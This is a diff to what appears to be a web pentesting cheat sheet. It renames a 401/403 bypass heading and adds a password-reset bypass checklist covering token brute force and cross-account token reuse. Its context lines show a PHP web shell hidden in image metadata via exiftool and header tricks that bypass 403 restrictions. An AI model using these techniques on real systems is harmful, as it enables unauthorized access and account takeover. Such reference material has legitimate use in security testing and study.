@@ -21,11 +21,12 @@
   - [Basic enumeration](#basic-enumeration)
      - [find subdomains](#find-subdomains)
      - [brute force >](#brute-force)
-            - [hydra](#hydra)
-            - [ffuf](#ffuf)
+     		- [hydra](#hydra)
+      		- [ffuf](#ffuf)
    - [Bypass technics](#bypass-technics)
      - [Bypass file upload filtering](#bypass-file-upload-filtering)
-     - [401/403 bypass](#401403-bypass)
+     - [Bypass 401/403](#401403-bypass)
+     - [Bypass password reset](#bypass-password-reset)
   - [Open redirect](#open-web-redirect)
   - [PHP filter](#php-filters-for-lfi)
   - [Cross Side Scripting (XSS)](#xss-common-payloads)
@@ -170,7 +171,7 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
 ```
-### 401/403 Bypass
+### Bypass 401/403
 ```http
 GET /api/getUser --> 403
 GET / + X-Original-URL : /api/GetUser --> 200
@@ -180,6 +181,14 @@ GET / + Referer : https://site.com/api/GetUser --> 200
 or
 GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 ```
+### Bypass password reset
+1. Include controlled mail as a second parameter
+2. Bruteforce reset token
+3. Try to use a reset token on another account
+4. Try to figure out how token are generated
+
+<img src="/assets/img/password-reset-bypass?raw=true" width="500" height="320" />
+
 -------------------------------------------------------------------------------------------------------------
 # Open web redirect
 
